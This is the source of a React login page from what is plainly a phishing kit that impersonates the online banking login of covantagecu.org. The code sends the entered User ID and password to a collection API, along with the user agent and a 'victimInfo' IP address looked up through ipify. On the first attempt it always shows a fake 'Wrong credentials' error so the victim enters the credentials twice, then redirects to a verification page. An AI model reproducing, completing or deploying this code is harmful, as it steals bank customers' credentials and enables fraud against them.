import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "covantagecu.org",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <>
      <FormLayout handleSubmit={handleSubmit}>
        <Input
          title="User ID"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        />

        <Input
          title="Password"
          type={"password"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        />

        {isWrong && (
          <div
            role="alert"
            className="alert alert-error my-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}

        <Button
          type="submit"
          disabled={isLoading}
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              "Continue"
            )
          }
        />

        <div className="text-center mt-2">
          <a
            href="#"
            className="text-[#25408F] hover:underline"
          >
            Forgot Password / User ID
          </a>
        </div>
      </FormLayout>
    </>
  );
};

export default Login;
